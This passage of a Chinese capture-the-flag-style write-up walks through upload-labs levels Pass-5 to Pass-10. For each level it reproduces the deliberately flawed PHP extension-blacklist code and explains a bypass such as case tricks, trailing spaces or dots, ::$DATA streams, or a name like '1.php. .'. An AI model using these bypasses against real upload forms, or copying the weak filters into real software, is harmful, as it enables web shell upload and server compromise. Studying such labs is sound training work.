class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br>        $file_name = trim($_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        $file_name = deldot($file_name);<span class="hljs-comment">//删除文件名末尾的点</span><br>        $file_ext = strrchr($file_name, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        $file_ext = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, $file_ext);<span class="hljs-comment">//去除字符串::$DATA</span><br>        $file_ext = trim($file_ext); <span class="hljs-comment">//首尾去空</span><br><br>        <span class="hljs-keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;<br>            $temp_file = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            $img_path = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.date(<span class="hljs-string">&quot;YmdHis&quot;</span>).rand(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).$file_ext;<br>            <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;<br>                $is_upload = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                $msg = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            $msg = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        $msg = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-number">123456789101112131415161718192021222324252627</span><br></code></pre></td></tr></table></figure><p>相比于pass-4，过滤了.htaccess，但将后缀转换为小写去掉了，因此可以使用大小绕过<br><img src="https://img-blog.csdnimg.cn/2019061821314398.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190618213222393.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="Pass-6-空格绕过"><a href="#Pass-6-空格绕过" class="headerlink" title="Pass-6-空格绕过"></a>Pass-6-空格绕过</h2><p><strong>源码：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php">$is_upload = <span class="hljs-literal">false</span>;<br>$msg = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<br>        $deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br>        $file_name = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>        $file_name = deldot($file_name);<span class="hljs-comment">//删除文件名末尾的点</span><br>        $file_ext = strrchr($file_name, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        $file_ext = strtolower($file_ext); <span class="hljs-comment">//转换为小写</span><br>        $file_ext = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, $file_ext);<span class="hljs-comment">//去除字符串::$DATA</span><br>        <br>        <span class="hljs-keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;<br>            $temp_file = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            $img_path = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.date(<span class="hljs-string">&quot;YmdHis&quot;</span>).rand(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).$file_ext;<br>            <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;<br>                $is_upload = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                $msg = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            $msg = <span class="hljs-string">&#x27;此文件不允许上传&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        $msg = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-number">123456789101112131415161718192021222324252627</span><br></code></pre></td></tr></table></figure><p>相比于前两题，这题没有对后缀名进行去空，因此可以在后缀名加空格绕过<br><img src="https://img-blog.csdnimg.cn/20190618213558104.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190618213634557.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="Pass-7-点绕过"><a href="#Pass-7-点绕过" class="headerlink" title="Pass-7-点绕过"></a>Pass-7-点绕过</h2><p><strong>源码：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php">$is_upload = <span class="hljs-literal">false</span>;<br>$msg = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<br>        $deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br>        $file_name = trim($_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        $file_ext = strrchr($file_name, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        $file_ext = strtolower($file_ext); <span class="hljs-comment">//转换为小写</span><br>        $file_ext = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, $file_ext);<span class="hljs-comment">//去除字符串::$DATA</span><br>        $file_ext = trim($file_ext); <span class="hljs-comment">//首尾去空</span><br>        <br>        <span class="hljs-keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;<br>            $temp_file = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            $img_path = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.$file_name;<br>            <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;<br>                $is_upload = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                $msg = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            $msg = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        $msg = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-number">123456789101112131415161718192021222324252627</span><br></code></pre></td></tr></table></figure><p>没有对后缀名末尾的点进行处理，利用windows特性，会自动去掉后缀名中最后的”.”，可在后缀名中加”.”绕过：<br><img src="https://img-blog.csdnimg.cn/20190618214054814.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190618214120354.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="Pass-8-DATA绕过"><a href="#Pass-8-DATA绕过" class="headerlink" title="Pass-8-::$DATA绕过"></a>Pass-8-::$DATA绕过</h2><p><strong>源码：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php">$is_upload = <span class="hljs-literal">false</span>;<br>$msg = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<br>        $deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br>        $file_name = trim($_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        $file_name = deldot($file_name);<span class="hljs-comment">//删除文件名末尾的点</span><br>        $file_ext = strrchr($file_name, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        $file_ext = strtolower($file_ext); <span class="hljs-comment">//转换为小写</span><br>        $file_ext = trim($file_ext); <span class="hljs-comment">//首尾去空</span><br>        <br>        <span class="hljs-keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;<br>            $temp_file = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            $img_path = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.date(<span class="hljs-string">&quot;YmdHis&quot;</span>).rand(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).$file_ext;<br>            <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;<br>                $is_upload = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                $msg = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            $msg = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        $msg = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-number">123456789101112131415161718192021222324252627</span><br></code></pre></td></tr></table></figure><p>没有对后缀名中的’::$DATA’进行过滤。在php+windows的情况下：如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名。利用windows特性，可在后缀名中加” ::$DATA”绕过：<br><img src="https://img-blog.csdnimg.cn/20190618215039848.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190618215110311.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="Pass-9-点-空格-点绕过"><a href="#Pass-9-点-空格-点绕过" class="headerlink" title="Pass-9-点+空格+点绕过"></a>Pass-9-点+空格+点绕过</h2><p><strong>源码：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php">$is_upload = <span class="hljs-literal">false</span>;<br>$msg = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<br>        $deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br>        $file_name = trim($_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        $file_name = deldot($file_name);<span class="hljs-comment">//删除文件名末尾的点</span><br>        $file_ext = strrchr($file_name, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        $file_ext = strtolower($file_ext); <span class="hljs-comment">//转换为小写</span><br>        $file_ext = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, $file_ext);<span class="hljs-comment">//去除字符串::$DATA</span><br>        $file_ext = trim($file_ext); <span class="hljs-comment">//首尾去空</span><br>        <br>        <span class="hljs-keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;<br>            $temp_file = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            $img_path = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.$file_name;<br>            <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;<br>                $is_upload = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                $msg = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            $msg = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        $msg = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>代码先是去除文件名前后的空格，再去除文件名最后所有的<code>.</code>，再通过strrchar函数来寻找<code>.</code>来确认文件名的后缀，但是最后保存文件的时候没有重命名而使用的原始的文件名，导致可以利用1.php. .（点+空格+点）来绕过<br><img src="https://img-blog.csdnimg.cn/20190618224551741.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2019061822461747.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="Pass-10-双写绕过"><a href="#Pass-10-双写绕过" class="headerlink" title="Pass-10-双写绕过"></a>Pass-10-双写绕过</h2><p><strong>源码：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php">$is_upload = <span class="hljs-literal">false</span>;<br>$msg = <span class="hljs-literal">null</span>;<br><span 